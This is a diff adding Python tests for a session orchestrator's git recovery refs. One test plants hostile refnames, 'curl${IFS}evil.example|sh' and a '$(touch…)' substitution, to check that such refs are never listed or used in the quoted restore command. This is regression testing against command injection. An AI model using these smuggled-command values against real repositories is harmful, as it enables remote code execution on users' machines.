@@ -198,6 +198,44 @@ def test_another_sessions_refs_are_never_listed(env):
     assert [r["ref"] for r in twin["refs"]] == [twin_ref]
 
 
+def test_a_planted_ref_is_never_listed_or_the_restore_source(env):
+    """Review fix: git allows ``;``, ``$``, ``|`` … in a refname, and anyone in the
+    worktree can plant one under the session's namespace. Only names
+    ``_write_recovery_ref`` writes are listed, and the restore command is quoted."""
+    _dirty(env["cwd"])
+    good = worktrees.snapshot_recovery_ref(env["cwd"], SID, reason="drain")
+    head = _git("rev-parse", "HEAD", cwd=env["clone"])
+    ns = f"{worktrees.RECOVERY_REF_NS}/abcd1234"
+    # Sorts after the good ref, so it would be "newest" and the restore source.
+    planted = [f"{ns}/zzz;curl${{IFS}}evil.example|sh", f"{ns}/$(touch${{IFS}}pwned)-drain"]
+    for ref in planted:
+        _git("update-ref", ref, head, cwd=env["clone"])
+
+    async def run():
+        orch = await _orch(env, _row(SID, cwd=env["cwd"]))
+        return await orch.session_recovery_refs(SID)
+
+    out = asyncio.run(run())
+    assert [r["ref"] for r in out["refs"]] == [good]
+    assert out["restoreCommand"] == worktrees.restore_command(good)
+    assert "curl" not in out["restoreCommand"] and "$(" not in out["restoreCommand"]
+    assert worktrees.recovery_refs(str(env["clone"]), SID) == [good]
+
+
+def test_an_unreadable_worktree_falls_back_to_the_clone(env):
+    """A ``.git`` that git cannot read (its gitdir is gone) is not "no refs": the clone
+    still holds them."""
+    _dirty(env["cwd"])
+    ref = worktrees.snapshot_recovery_ref(env["cwd"], SID, reason="drain")
+    (Path(env["cwd"]) / ".git").write_text(f"gitdir: {env['tmp'] / 'nowhere'}\n")
+
+    async def run():
+        orch = await _orch(env, _row(SID, cwd=env["cwd"]))
+        return await orch.session_recovery_refs(SID)
+
+    assert [r["ref"] for r in asyncio.run(run())["refs"]] == [ref]
+
+
 def test_an_unknown_session_is_a_key_error_marked_as_an_expected_refusal(env):
     async def run():
         orch = await _orch(env)
